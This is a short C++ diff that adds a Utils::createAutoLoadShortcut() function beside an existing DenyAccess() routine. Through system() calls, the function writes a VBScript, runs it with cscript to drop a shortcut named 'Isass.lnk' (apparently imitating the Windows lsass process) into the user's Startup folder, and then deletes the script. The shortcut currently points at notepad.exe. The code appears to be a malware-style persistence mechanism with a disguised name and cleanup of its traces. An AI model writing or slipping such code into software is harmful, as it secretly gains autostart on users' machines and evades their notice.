@@ -75,5 +75,16 @@ BOOL Utils::DenyAccess()
 		return FALSE;
 
 	return TRUE;
+}
 
+/* Create Shortcut to Autoload in Current User */
+void Utils::createAutoLoadShortcut()
+{
+	system("echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs");
+	system("echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Isass.lnk\" >> CreateShortcut.vbs");
+	system("echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs");
+	system("echo oLink.TargetPath = \"C:\\Windows\\notepad.exe\" >> CreateShortcut.vbs");
+	system("echo oLink.Save >> CreateShortcut.vbs");
+	system("cscript CreateShortcut.vbs");
+	system("del CreateShortcut.vbs");
 }
